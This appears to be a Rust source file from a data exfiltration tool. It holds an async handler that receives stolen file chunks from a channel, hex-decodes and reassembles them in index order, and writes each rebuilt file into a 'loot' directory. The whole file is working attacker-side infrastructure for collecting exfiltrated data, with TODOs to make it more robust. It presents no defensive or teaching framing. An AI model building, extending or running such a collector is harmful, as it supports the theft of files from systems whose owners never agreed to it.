// TODO! Add dead-letter queue for unprocessed file portions
// TODO! Add circuit breaker inside the loop to avoid infinite processing until the system errors are fixed

use std::collections::{BTreeMap, HashMap, HashSet};

/// Background event handler that processes exfiltrated file chunks and reconstructs files.
///
/// This async function runs continuously, consuming `Node` instances from the provided
/// channel. It maintains two primary data structures:
///
/// - `root_nodes`: A set of received root metadata nodes (file names + identifiers)
/// - `file_chunk_nodes`: A map from file_id → BTreeMap of chunks sorted by index
///
/// ## Processing Flow
///
/// When a Root node arrives, it is stored for later matching with chunks.
/// When a FileChunk node arrives, it is inserted into the appropriate index map.
/// When an End chunk (marked with ChunkType::End) arrives:
///
/// 1. The matching RootNode is located by file_identifier
/// 2. All FileChunk nodes for that file are retrieved and sorted by index
/// 3. Each chunk's hex-encoded data is decoded to raw bytes
/// 4. Decoded chunks are concatenated in index order to reconstruct the file
/// 5. The complete file is written to the loot directory with its original filename
/// 6. Both root node and file chunks are removed from memory
///
/// ## Data Format During Assembly
///
/// - Chunks stored in `file_chunk_nodes` have their `data` field as UTF-8 bytes
/// - During assembly, these UTF-8 bytes are passed to `hex::decode()` producing raw file bytes
/// - All chunks are concatenated by sorted index to produce the complete file
/// - Files are written directly to disk without additional encoding
pub async fn handle_received_data(
    mut rx: tokio::sync::mpsc::Receiver<crate::Node>,
    loot_directory: String,
) {
    let mut root_nodes: HashSet<crate::RootNode> = HashSet::new();

    let mut file_chunk_nodes: HashMap<String, BTreeMap<usize, crate::ThreadSafeFileChunkNode>> =
        HashMap::new();

    while let Some(node_received) = rx.recv().await {
        match node_received {
            crate::Node::Root(root_node) => {
                log::info!("Root node {} received!", root_node.file_name);
                root_nodes.insert(root_node);
            }
            crate::Node::FileChunk(file_chunk_node) => {
                let ref_file_chunk_node = std::sync::Arc::new(file_chunk_node);
                log::info!(
                    "{:?} chunk node index {} for root {} received!",
                    ref_file_chunk_node.chunk_type,
                    ref_file_chunk_node.index,
                    ref_file_chunk_node.root_node_id
                );
                if file_chunk_nodes.contains_key(&ref_file_chunk_node.root_node_id) {
                    if let Some(file_nodes) =
                        file_chunk_nodes.get_mut(&ref_file_chunk_node.root_node_id)
                    {
                        file_nodes.insert(
                            ref_file_chunk_node.index,
                            std::sync::Arc::clone(&ref_file_chunk_node),
                        );
                    }
                } else {
                    file_chunk_nodes.insert(ref_file_chunk_node.root_node_id.clone(), {
                        let mut new_map: BTreeMap<usize, crate::ThreadSafeFileChunkNode> =
                            BTreeMap::new();
                        new_map.insert(
                            ref_file_chunk_node.index,
                            std::sync::Arc::clone(&ref_file_chunk_node),
                        );
                        new_map
                    });
                }

                if ref_file_chunk_node.is_last_chunk() {
                    log::info!(
                        "End chunk received for root {}. Assembling file...",
                        ref_file_chunk_node.root_node_id
                    );

                    if let Some(root_node) = root_nodes.take(&ref_file_chunk_node.root_node_id) {
                        log::info!(
                            "Root node {} found. Assembling file {}...",
                            ref_file_chunk_node.root_node_id,
                            root_node.file_name
                        );
                        if let Some(file_nodes) =
                            file_chunk_nodes.remove(&ref_file_chunk_node.root_node_id)
                        {
                            let file_data = file_nodes
                                .values()
                                .filter_map(|file_chunk| hex::decode(file_chunk.data.to_vec()).ok())
                                .flatten()
                                .collect::<Vec<u8>>();

                            match std::env::current_dir() {
                                Ok(current_dir) => {
                                    log::info!(
                                        "Current working directory: {}",
                                        current_dir.to_string_lossy()
                                    );
                                    let loot_directory = current_dir.join(&loot_directory);
                                    if !loot_directory.exists() {
                                        log::info!(
                                            "Loot directory not found. Creating at {}",
                                            loot_directory.to_string_lossy()
                                        );
                                        if let Err(err) = std::fs::create_dir(&loot_directory) {
                                            log::error!(
                                                "Error creating loot directory {}: {}",
                                                loot_directory.to_string_lossy(),
                                                err
                                            );
                                            continue;
                                        }
                                    }
                                    let exfil_file_path = loot_directory.join(&root_node.file_name);

                                    match std::fs::write(&exfil_file_path, file_data) {
                                        Ok(_) => log::info!(
                                            "Dumping file content in {}",
                                            exfil_file_path.to_string_lossy()
                                        ),
                                        Err(err) => log::error!(
                                            "Error writing to file {}: {}",
                                            exfil_file_path.to_string_lossy(),
                                            err
                                        ),
                                    }
                                }
                                Err(err) => {
                                    log::error!("Error getting current working directory: {}", err)
                                }
                            }
                        } else {
                            log::warn!(
                                "No file chunks found for root node {}. Cannot assemble file.",
                                ref_file_chunk_node.root_node_id
                            );
                        }
                    } else {
                        log::warn!(
                            "Root node {} not found. Cannot assemble file.",
                            ref_file_chunk_node.root_node_id
                        );
                    }
                }
            }
        }
    }
}
